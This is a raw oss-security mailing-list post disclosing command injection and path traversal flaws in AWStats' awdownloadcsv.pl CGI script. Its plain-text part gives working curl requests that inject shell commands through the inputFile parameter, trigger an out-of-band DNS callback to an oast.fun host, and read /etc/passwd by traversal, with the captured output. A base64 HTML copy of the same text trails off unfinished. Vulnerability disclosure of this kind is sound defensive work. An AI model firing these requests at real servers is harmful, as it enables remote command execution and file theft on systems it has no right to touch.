Received: (qmail 15752 invoked by uid 550); 8 Mar 2026 09:00:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 16051 invoked from network); 8 Mar 2026 08:26:40 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=vadersecurity.com;
	s=protonmail3; t=1772958389; x=1773217589;
	bh=piF86ueVKW09jvTn0UKmJC4/m+wo93PzFVACZOlq40g=;
	h=Date:To:From:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
	b=Spe8Bw+Adv+Cb3nNi4BQcxOeU1knaKT6jqPlMW6yIbybTR3CsiSqSBm/mEHVp22Jh
	 0wPuIxuXtmpvgdMLhPHJJTQwv4Kp37kqe6uV7ibcrztzx/rhke1YTSbJuRz3EZNs26
	 HLdKJL7++4B+9yg66Wt/iAMWwbX7KMLsKMBKLb8LI8J4V7dtTnZ1suMIHi3qm+ySjF
	 e5YsHek5aWpznEd1rrgfbmdyNiTXZkNIfrZydpPr0LFVSumXZ7ZY2yLXaDpvv/AqaD
	 yQPPiUyO0/M1YqAnpB3CCFbaXA+qVUYrHg4ZOB1INiHjknCjOHf7h8rHOjc17bA32M
	 f8MLqd2t1gz0A==
Date: Sun, 08 Mar 2026 08:26:23 +0000
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
From: "christopher.downs" <christopher.downs@vadersecurity.com>
Message-ID: <Z2Y_rOJaVlLCYFBjgdkkl4SNaDAPnNTwxykLMSRBhRmA_lpIrjmLP4zrLhBwL1KHxJ465aMmWAEG4nTm5bHvY2o7KMUdoUJ-427OZLiHxDk=@vadersecurity.com>
Feedback-ID: 13432879:user:proton
X-Pm-Message-ID: 1c547db5dd82b647d1c1f1d68818a97881f19a3a
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha512; boundary="------a043c1983cdd113762287eebec6f8c317110d557b571c638388ff70107d79164"; charset=utf-8
Subject: [oss-security] AWStats awdownloadcsv.pl command injection and path traversal vulnerabilities

--------a043c1983cdd113762287eebec6f8c317110d557b571c638388ff70107d79164
Content-Type: multipart/mixed;boundary=---------------------dd323473e62ef34d455d53cf67a42283

-----------------------dd323473e62ef34d455d53cf67a42283
Content-Type: multipart/alternative;boundary=---------------------5ad6be03bf5b32421fe2ccad79471c26

-----------------------5ad6be03bf5b32421fe2ccad79471c26
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

Evening,
Two vulnerabilities were identified in the AWStats CGI script awdownloadcsv=
.pl that may allow command injection and arbitrary file access.

Repository:
https://github.com/eldy/AWStats/tree/develop

Examples shown below are running locally in a Docker container for demonstr=
ation.=C2=A0

Download functionality is disabled. The Default.=C2=A0
my $ALLOWDOWNLOAD=3D0

#!/usr/bin/perl -w#--------------------------------------------------------=
----------------------
# Free addition to AWStats Web Log Analyzer. Used to export the contents of
# sections of the Apache server log database to CSV for use in other tools.
# Works from command line or as a CGI.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. =C2=A0See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#--------------------------------------------------------------------------=
----
use CGI qw(:standard);

my $ALLOWDOWNLOAD=3D0;
----- SNIP -----

Issue 1: Command Injection

The "section" parameter appears to be incorporated into shell commands with=
out proper sanitization. Injection of shell metacharacters such as "|" may =
allow an attacker to escape the intended command pipeline.=C2=A0

Example request(s):

vectorium-x[main] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awd=
ownloadcsv.pl?section=3D&inputFile=3D|id&outputFile=3D/tmp/j.csv'uid=3D33(w=
ww-data) gid=3D33(www-data) groups=3D33(www-data)
vectorium-x[main] %

vectorium-x[main*] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/aw=
downloadcsv.pl?section=3D&inputFile=3D|getent%20hosts%20d6mhta6p9lkdgas4c2r=
0ujhuo3iyb8n4o.oast.fun&outputFile=3D/tmp/j.csv'

206.189.156.69 =C2=A0d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o.oast.fun
vectorium-x[main*] %

/tmp % interactsh-client -dns-only -o /tmp/interact_$(date +%s).interact
=C2=A0 =C2=A0 _ =C2=A0 =C2=A0 =C2=A0 __ =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 __ =C2=A0 =C2=A0 =C2=A0 __
=C2=A0 =C2=A0(_)___ =C2=A0/ /____ =C2=A0_________ ______/ /______/ /_
=C2=A0 / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
=C2=A0/ / / / / /_/ =C2=A0__/ / =C2=A0/ /_/ / /__/ /_(__ =C2=A0) / / /
/_/_/ /_/\__/\___/_/ =C2=A0 \__,_/\___/\__/____/_/ /_/

projectdiscovery.io

[INF] Current interactsh version 1.3.0 (latest)
[INF] Listing 1 payload for OOB Testing
[INF] d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o.oast.fun
[d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o] Received DNS interaction (AAAA) from 66=
.185.115.247 at 2026-03-08 07:02:25
[d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o] Received DNS interaction (AAAA) from 66=
.185.115.247 at 2026-03-08 07:02:25
[d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o] Received DNS interaction (A) from 66.18=
5.115.247 at 2026-03-08 07:02:25

Issue 2: Path Traversal / Arbitrary File Read

The "inputFile" parameter is used directly in file operations without valid=
ation, allowing directory traversal.

Example code pattern:

if ($q->param("inputFile")) {
if ($inputFile eq '') { $inputFile =3D $q->param("inputFile"); }
}

open (IN, $inputFile) || die "cannot open $inputFile\n";

Example request:

vectorium-x[main] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awd=
ownloadcsv.pl?section=3D|root&inputFile=3D..%2f..%2f..%2f..%2f..%2f..%2f..%=
2fetc%2fpasswd&outputFile=3D/tmp/pwnd.csv'daemon:x:1:1:daemon:/usr/sbin:/us=
r/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing,List,Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
vectorium-x[main] %

/tmp/pwnd.csv written to disk:
vectorium-x[main] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awd=
ownloadcsv.pl?section=3D|root&inputFile=3D|cat%20/tmp/pwnd.csv&outputFile=
=3D'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
----- SNIP -----

Impact

Depending on deployment configuration, these issues may allow:

-   command execution
=20=20=20=20

-   reading arbitrary files
=20=20=20=20

-   writing attacker-controlled output files
=20=20=20=20


Disclosure

The upstream developer was contacted previously regarding these issues. No =
response was received, so this notice is being sent to the oss-security lis=
t for awareness.

August 30th 2025
September 6th 2025

Thanks All --


Sent with Proton Mail secure email.=

-----------------------5ad6be03bf5b32421fe2ccad79471c26
Content-Type: multipart/related;boundary=---------------------976c1e9d9041f86e37d48a344ea2340f

-----------------------976c1e9d9041f86e37d48a344ea2340f
Content-Type: text/html;charset=utf-8
Content-Transfer-Encoding: base64

PGRpdiBzdHlsZT0iZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBmb250LXNpemU6IDE0
cHg7Ij48ZGl2IGRhdGEtc3RhcnQ9IjgwIiBkYXRhLWVuZD0iMjE4IiBzdHlsZT0ibWFyZ2luLXRv
cDogMTRweDsgbWFyZ2luLWJvdHRvbTogMTRweDsiPkV2ZW5pbmcsIDxicj5Ud28gdnVsbmVyYWJp
bGl0aWVzIHdlcmUgaWRlbnRpZmllZCBpbiB0aGUgQVdTdGF0cyBDR0kgc2NyaXB0IGF3ZG93bmxv
YWRjc3YucGwgdGhhdCBtYXkgYWxsb3cgY29tbWFuZCBpbmplY3Rpb24gYW5kIGFyYml0cmFyeSBm
aWxlIGFjY2Vzcy48YnI+PGJyPlJlcG9zaXRvcnk6PGJyPjxzcGFuPjxhIHRhcmdldD0iX2JsYW5r
IiByZWw9Im5vcmVmZXJyZXIgbm9mb2xsb3cgbm9vcGVuZXIiIGhyZWY9Imh0dHBzOi8vZ2l0aHVi
LmNvbS9lbGR5L0FXU3RhdHMvdHJlZS9kZXZlbG9wIj5odHRwczovL2dpdGh1Yi5jb20vZWxkeS9B
V1N0YXRzL3RyZWUvZGV2ZWxvcDwvYT48YnI+PC9zcGFuPjxicj5FeGFtcGxlcyBzaG93biBiZWxv
dyBhcmUgcnVubmluZyBsb2NhbGx5IGluIGEgRG9ja2VyIGNvbnRhaW5lciBmb3IgZGVtb25zdHJh
dGlvbi4mbmJzcDs8YnI+PGJyPkRvd25sb2FkIGZ1bmN0aW9uYWxpdHkgaXMgZGlzYWJsZWQuIFRo
ZSBEZWZhdWx0LiZuYnNwOzxicj5teSAkQUxMT1dET1dOTE9BRD0wPGJyPjxicj48c3Bhbj4jIS91
c3IvYmluL3BlcmwgLXc8L3NwYW4+PGRpdj48c3Bhbj4jLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPC9z
cGFuPjwvZGl2PjxkaXY+PHNwYW4+IyBGcmVlIGFkZGl0aW9uIHRvIEFXU3RhdHMgV2ViIExvZyBB
bmFseXplci4gVXNlZCB0byBleHBvcnQgdGhlIGNvbnRlbnRzIG9mPC9zcGFuPjwvZGl2PjxkaXY+
PHNwYW4+IyBzZWN0aW9ucyBvZiB0aGUgQXBhY2hlIHNlcnZlciBsb2cgZGF0YWJhc2UgdG8gQ1NW
IGZvciB1c2UgaW4gb3RoZXIgdG9vbHMuPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+IyBXb3JrcyBm
cm9tIGNvbW1hbmQgbGluZSBvciBhcyBhIENHSS4gPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+Izwv
c3Bhbj48L2Rpdj48ZGl2PjxzcGFuPiMgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlv
dSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnk8L3NwYW4+PC9kaXY+PGRpdj48c3Bh
bj4jIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2Ug
YXMgcHVibGlzaGVkIGJ5PC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+IyB0aGUgRnJlZSBTb2Z0d2Fy
ZSBGb3VuZGF0aW9uOyBlaXRoZXIgdmVyc2lvbiAyIG9mIHRoZSBMaWNlbnNlLCBvcjwvc3Bhbj48
L2Rpdj48ZGl2PjxzcGFuPiMgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi48L3Nw
YW4+PC9kaXY+PGRpdj48c3Bhbj4jPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+IyBUaGlzIHByb2dy
YW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCw8L3Nw
YW4+PC9kaXY+PGRpdj48c3Bhbj4jIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBl
dmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+IyBNRVJD
SEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICZuYnNwO1Nl
ZSB0aGU8L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj4jIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNl
IGZvciBtb3JlIGRldGFpbHMuPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+Izwvc3Bhbj48L2Rpdj48
ZGl2PjxzcGFuPiMgWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdl
bmVyYWwgUHVibGljIExpY2Vuc2U8L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj4jIGFsb25nIHdpdGgg
dGhpcyBwcm9ncmFtLiBJZiBub3QsIHNlZSAmbHQ7PGEgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9y
ZWZlcnJlciBub2ZvbGxvdyBub29wZW5lciIgaHJlZj0iaHR0cDovL3d3dy5nbnUub3JnL2xpY2Vu
c2VzLyI+aHR0cDovL3d3dy5nbnUub3JnL2xpY2Vuc2VzLzwvYT4mZ3Q7Ljwvc3Bhbj48L2Rpdj48
ZGl2PjxzcGFuPiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS08L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj51
c2UgQ0dJIHF3KDpzdGFuZGFyZCk7PC9zcGFuPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+PHNw
YW4+bXkgJEFMTE9XRE9XTkxPQUQ9MDs8L3NwYW4+PC9kaXY+PHNwYW4+PC9zcGFuPi0tLS0tIFNO
SVAgLS0tLS08L2Rpdj48cCBkYXRhLXN0YXJ0PSIyMjAiIGRhdGEtZW5kPSIyNDYiPklzc3VlIDE6
IENvbW1hbmQgSW5qZWN0aW9uPC9wPjxwIGRhdGEtc3RhcnQ9IjI0OCIgZGF0YS1lbmQ9IjQ1NiI+
VGhlICJzZWN0aW9uIiBwYXJhbWV0ZXIgYXBwZWFycyB0byBiZSBpbmNvcnBvcmF0ZWQgaW50byBz
aGVsbCBjb21tYW5kcyB3aXRob3V0IHByb3BlciBzYW5pdGl6YXRpb24uIEluamVjdGlvbiBvZiBz
aGVsbCBtZXRhY2hhcmFjdGVycyBzdWNoIGFzICJ8IiBtYXkgYWxsb3cgYW4gYXR0YWNrZXIgdG8g
ZXNjYXBlIHRoZSBpbnRlbmRlZCBjb21tYW5kIHBpcGVsaW5lLiZuYnNwOzxicj48c3Bhbj48L3Nw
YW4+PC9wPjxkaXYgZGF0YS1zdGFydD0iNDU4IiBkYXRhLWVuZD0iNDc0IiBzdHlsZT0ibWFyZ2lu
LXRvcDogMTRweDsgbWFyZ2luLWJvdHRvbTogMTRweDsiPkV4YW1wbGUgcmVxdWVzdChzKTo8YnI+
PGJyPjxzcGFuPnZlY3Rvcml1bS14W21haW5dICUgY3VybCAtcSAtLXBhdGgtYXMtaXMgJzxhIHRh
cmdldD0iX2JsYW5rIiByZWw9Im5vcmVmZXJyZXIgbm9mb2xsb3cgbm9vcGVuZXIiIGhyZWY9Imh0
dHA6Ly8xMjcuMC4wLjE6ODg4OC9hd3N0YXRzL2F3ZG93bmxvYWRjc3YucGw/c2VjdGlvbj0mYW1w
O2lucHV0RmlsZT18aWQmYW1wO291dHB1dEZpbGU9L3RtcC9qLmNzdiI+aHR0cDovLzEyNy4wLjAu
MTo4ODg4L2F3c3RhdHMvYXdkb3dubG9hZGNzdi5wbD9zZWN0aW9uPSZhbXA7aW5wdXRGaWxlPXxp
ZCZhbXA7b3V0cHV0RmlsZT0vdG1wL2ouY3N2PC9hPic8L3NwYW4+PGRpdj48c3Bhbj51aWQ9MzMo
d3d3LWRhdGEpIGdpZD0zMyh3d3ctZGF0YSkgZ3JvdXBzPTMzKHd3dy1kYXRhKTwvc3Bhbj48L2Rp
dj48ZGl2PjxzcGFuPnZlY3Rvcml1bS14W21haW5dICU8L3NwYW4+PC9kaXY+PHNwYW4+PC9zcGFu
Pjxicj48L2Rpdj48cCBkYXRhLXN0YXJ0PSI0NzYiIGRhdGEtZW5kPSI1MTUiPjxzcGFuPnZlY3Rv
cml1bS14W21haW4qXSAlIGN1cmwgLXEgLS1wYXRoLWFzLWlzICc8YSB0YXJnZXQ9Il9ibGFuayIg
cmVsPSJub3JlZmVycmVyIG5vZm9sbG93IG5vb3BlbmVyIiBocmVmPSJodHRwOi8vMTI3LjAuMC4x
Ojg4ODgvYXdzdGF0cy9hd2Rvd25sb2FkY3N2LnBsP3NlY3Rpb249JmFtcDtpbnB1dEZpbGU9fGdl
dGVudCUyMGhvc3RzJTIwZDZtaHRhNnA5bGtkZ2FzNGMycjB1amh1bzNpeWI4bjRvLm9hc3QuZnVu
JmFtcDtvdXRwdXRGaWxlPS90bXAvai5jc3YiPmh0dHA6Ly8xMjcuMC4wLjE6ODg4OC9hd3N0YXRz
L2F3ZG93bmxvYWRjc3YucGw/c2VjdGlvbj0mYW1wO2lucHV0RmlsZT18Z2V0ZW50JTIwaG9zdHMl
MjBkNm1odGE2cDlsa2RnYXM0YzJyMHVqaHVvM2l5YjhuNG8ub2FzdC5mdW4mYW1wO291dHB1dEZp
bGU9L3RtcC9qLmNzdjwvYT4nPC9zcGFuPjwvcD48ZGl2PjxzcGFuPjIwNi4xODkuMTU2LjY5ICZu
YnNwO2Q2bWh0YTZwOWxrZGdhczRjMnIwdWpodW8zaXliOG40by5vYXN0LmZ1bjwvc3Bhbj48L2Rp
dj48ZGl2PjxzcGFuPnZlY3Rvcml1bS14W21haW4qXSAlPGJyPjxicj48c3Bhbj4vdG1wICUgaW50
ZXJhY3RzaC1jbGllbnQgLWRucy1vbmx5IC1vIC90bXAvaW50ZXJhY3RfJChkYXRlICslcykuaW50
ZXJhY3Q8L3NwYW4+PGRpdj48YnI+PC9kaXY+PGRpdj48c3Bhbj4mbmJzcDsgJm5ic3A7IF8gJm5i
c3A7ICZuYnNwOyAmbmJzcDsgX18gJm5ic3A7ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICZuYnNwOyAm
bmJzcDsgJm5ic3A7ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICZuYnNwOyBfXyAmbmJzcDsgJm5ic3A7
ICZuYnNwOyBfXzwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFuPiZuYnNwOyAmbmJzcDsoXylfX18gJm5i
c3A7LyAvX19fXyAmbmJzcDtfX19fX19fX18gX19fX19fLyAvX19fX19fLyAvXzwvc3Bhbj48L2Rp
dj48ZGl2PjxzcGFuPiZuYnNwOyAvIC8gX18gXC8gX18vIF8gXC8gX19fLyBfXyAnLyBfX18vIF9f
LyBfX18vIF9fIFw8L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj4mbmJzcDsvIC8gLyAvIC8gL18vICZu
YnNwO19fLyAvICZuYnNwOy8gL18vIC8gL19fLyAvXyhfXyAmbmJzcDspIC8gLyAvPC9zcGFuPjwv
ZGl2PjxkaXY+PHNwYW4+L18vXy8gL18vXF9fL1xfX18vXy8gJm5ic3A7IFxfXyxfL1xfX18vXF9f
L19fX18vXy8gL18vPC9zcGFuPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+PHNwYW4+CQk8YSB0
YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vZm9sbG93IG5vb3BlbmVyIiBocmVmPSJo
dHRwOi8vcHJvamVjdGRpc2NvdmVyeS5pbyI+cHJvamVjdGRpc2NvdmVyeS5pbzwvYT48L3NwYW4+
PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj48c3Bhbj5bSU5GXSBDdXJyZW50IGludGVyYWN0c2gg
dmVyc2lvbiAxLjMuMCAobGF0ZXN0KTwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFuPltJTkZdIExpc3Rp
bmcgMSBwYXlsb2FkIGZvciBPT0IgVGVzdGluZzwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFuPltJTkZd
IGQ2bWh0YTZwOWxrZGdhczRjMnIwdWpodW8zaXliOG40by5vYXN0LmZ1bjwvc3Bhbj48L2Rpdj48
ZGl2PjxzcGFuPltkNm1odGE2cDlsa2RnYXM0YzJyMHVqaHVvM2l5YjhuNG9dIFJlY2VpdmVkIERO
UyBpbnRlcmFjdGlvbiAoQUFBQSkgZnJvbSA2Ni4xODUuMTE1LjI0NyBhdCAyMDI2LTAzLTA4IDA3
OjAyOjI1PC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+W2Q2bWh0YTZwOWxrZGdhczRjMnIwdWpodW8z
aXliOG40b10gUmVjZWl2ZWQgRE5TIGludGVyYWN0aW9uIChBQUFBKSBmcm9tIDY2LjE4NS4xMTUu
MjQ3IGF0IDIwMjYtMDMtMDggMDc6MDI6MjU8L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj5bZDZtaHRh
NnA5bGtkZ2FzNGMycjB1amh1bzNpeWI4bjRvXSBSZWNlaXZlZCBETlMgaW50ZXJhY3Rpb24gKEEp
IGZyb20gNjYuMTg1LjExNS4yNDcgYXQgMjAyNi0wMy0wOCAwNzowMjoyNTwvc3Bhbj48L2Rpdj48
L3NwYW4+PC9kaXY+PHNwYW4+PC9zcGFuPjxwPjwvcD48cCBkYXRhLXN0YXJ0PSI1MTciIGRhdGEt
ZW5kPSI1NjIiPklzc3VlIDI6IFBhdGggVHJhdmVyc2FsIC8gQXJiaXRyYXJ5IEZpbGUgUmVhZDwv
cD48cCBkYXRhLXN0YXJ0PSI1NjQiIGRhdGEtZW5kPSI2NzUiPlRoZSAiaW5wdXRGaWxlIiBwYXJh
bWV0ZXIgaXMgdXNlZCBkaXJlY3RseSBpbiBmaWxlIG9wZXJhdGlvbnMgd2l0aG91dCB2YWxpZGF0
aW9uLCBhbGxvd2luZyBkaXJlY3RvcnkgdHJhdmVyc2FsLjwvcD48cCBkYXRhLXN0YXJ0PSI2Nzci
IGRhdGEtZW5kPSI2OTgiPkV4YW1wbGUgY29kZSBwYXR0ZXJuOjwvcD48cCBkYXRhLXN0YXJ0PSI3
MDIiIGRhdGEtZW5kPSI4MDIiPmlmICgkcS0mZ3Q7cGFyYW0oImlucHV0RmlsZSIpKSB7PGJyPgpp
ZiAoJGlucHV0RmlsZSBlcSAnJykgeyAkaW5wdXRGaWxlID0gJHEtJmd0O3BhcmFtKCJpbnB1dEZp
bGUiKTsgfTxicj4KfTwvcD48cCBkYXRhLXN0YXJ0PSI4MDYiIGRhdGEtZW5kPSI4NjIiPm9wZW4g
KElOLCAkaW5wdXRGaWxlKSB8fCBkaWUgImNhbm5vdCBvcGVuICRpbnB1dEZpbGVcbiI7PC9wPjxw
IGRhdGEtc3RhcnQ9Ijg2NCIgZGF0YS1lbmQ9Ijg4MCI+RXhhbXBsZSByZXF1ZXN0OjwvcD48ZGl2
IGRhdGEtc3RhcnQ9Ijg4MiIgZGF0YS1lbmQ9Ijk0NiIgc3R5bGU9Im1hcmdpbi10b3A6IDE0cHg7
IG1hcmdpbi1ib3R0b206IDE0cHg7Ij48c3Bhbj52ZWN0b3JpdW0teFttYWluXSAlIGN1cmwgLXEg
LS1wYXRoLWFzLWlzICc8YSB0YXJnZXQ9Il9ibGFuayIgcmVsPSJub3JlZmVycmVyIG5vZm9sbG93
IG5vb3BlbmVyIiBocmVmPSJodHRwOi8vMTI3LjAuMC4xOjg4ODgvYXdzdGF0cy9hd2Rvd25sb2Fk
Y3N2LnBsP3NlY3Rpb249fHJvb3QmYW1wO2lucHV0RmlsZT0uLiUyZi4uJTJmLi4lMmYuLiUyZi4u
JTJmLi4lMmYuLiUyZmV0YyUyZnBhc3N3ZCZhbXA7b3V0cHV0RmlsZT0vdG1wL3B3bmQuY3N2Ij5o
dHRwOi8vMTI3LjAuMC4xOjg4ODgvYXdzdGF0cy9hd2Rvd25sb2FkY3N2LnBsP3NlY3Rpb249fHJv
b3QmYW1wO2lucHV0RmlsZT0uLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZmV0YyUy
ZnBhc3N3ZCZhbXA7b3V0cHV0RmlsZT0vdG1wL3B3bmQuY3N2PC9hPic8L3NwYW4+PGRpdj48c3Bh
bj5kYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbjwvc3Bhbj48
L2Rpdj48ZGl2PjxzcGFuPmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpbjwvc3Bh
bj48L2Rpdj48ZGl2PjxzcGFuPnN5czp4OjM6MzpzeXM6L2RldjovdXNyL3NiaW4vbm9sb2dpbjwv
c3Bhbj48L2Rpdj48ZGl2PjxzcGFuPnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmM8
L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj5nYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNy
L3NiaW4vbm9sb2dpbjwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFuPm1hbjp4OjY6MTI6bWFuOi92YXIv
Y2FjaGUvbWFuOi91c3Ivc2Jpbi9ub2xvZ2luPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+bHA6eDo3
Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW48L3NwYW4+PC9kaXY+PGRpdj48
c3Bhbj5tYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luPC9zcGFuPjwv
ZGl2PjxkaXY+PHNwYW4+bmV3czp4Ojk6OTpuZXdzOi92YXIvc3Bvb2wvbmV3czovdXNyL3NiaW4v
bm9sb2dpbjwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFuPnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bv
b2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbjwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFuPnByb3h5Ong6
MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpbjwvc3Bhbj48L2Rpdj48ZGl2PjxzcGFu
Pnd3dy1kYXRhOng6MzM6MzM6d3d3LWRhdGE6L3Zhci93d3c6L3Vzci9zYmluL25vbG9naW48L3Nw
YW4+PC9kaXY+PGRpdj48c3Bhbj5iYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91
c3Ivc2Jpbi9ub2xvZ2luPC9zcGFuPjwvZGl2PjxkaXY+PHNwYW4+bGlzdDp4OjM4OjM4Ok1haWxp
bmcsTGlzdCxNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpbjwvc3Bhbj48L2Rpdj48
ZGl2PjxzcGFuPmlyYzp4OjM5OjM5OmlyY2Q6L3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luPC9z
cGFuPjwvZGl2PjxkaXY+PHNwYW4+X2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9z
YmluL25vbG9naW48L3NwYW4+PC9kaXY+PGRpdj48c3Bhbj5ub2JvZHk6eDo2NTUzNDo2NTUzNDpu
b2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luPC9zcGFuPjwvZGl2PjxkaXY+PHNw
YW4+dmVjdG9yaXVtLXhbbWFpbl0gJTxicj48YnI+L3RtcC9wd25kLmNzdiB3cml0dGVuIHRvIGRp
c2s6PGJyPjxzcGFuPnZlY3Rvcml1bS14W21haW5dICUgY3VybCAtcSAtLXBhdGgtYXMtaXMgJzxh
IHRhcmdldD0iX2JsYW5rIiByZWw9Im5vcmVmZXJyZXIgbm9mb2xsb3cgbm9vcGVuZXIiIGhyZWY9
Imh0dHA6Ly8xMjcuMC4wLjE6ODg4OC9hd3N0YXRzL2F3ZG93bmxvYWRjc3YucGw/c2VjdGlvbj18
cm9vdCZhbXA7aW5wdXRGaWxlPXxjYXQlMjAvdG1wL3B3bmQuY3N2JmFtcDtvdXRwdXRGaWxlPSI+
aHR0cDovLzEyNy4wLjAuMTo4ODg4L2F3c3RhdHMvYXdkb3dubG9hZGNzdi5wbD9zZWN0aW9uPXxy
b290JmFtcDtpbnB1dEZpbGU9fGNhdCUyMC90bXAvcHduZC5jc3YmYW1wO291dHB1dEZpbGU9PC9h
